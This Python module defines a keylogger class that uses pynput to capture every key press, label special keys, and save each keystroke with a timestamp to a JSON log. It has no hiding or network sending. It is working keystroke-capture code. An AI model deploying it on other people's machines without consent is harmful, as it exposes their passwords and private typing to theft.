from pynput.keyboard import Listener
from datetime import datetime
import threading
from keylogger.data_storage import DataStorage

class KeyboardLogger:
    def __init__(self, output_path="keylogs.json"):
        self.output_path = output_path
        self.data_storage = DataStorage(output_path)
        self.listener = None

    def on_press(self, key):
        try:
            key_name = key.char
        except AttributeError:
            key_name = str(key)

        if key_name == "Key.space":
            key_name = " "
        elif key_name == "Key.enter":
            key_name = "[ENTER]"
        elif key_name == "Key.backspace":
            key_name = "[BACKSPACE]"
        elif "Key." in key_name:
            key_name = f"[{key_name.replace('Key.', '').upper()}]"

        key_event = {
            "key": key_name,
            "timestamp": str(datetime.now())
        }
        self.data_storage.append_keystroke(key_event)

    def start_listener(self):
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()

    def stop_listener(self):
        if self.listener:
            self.listener.stop()
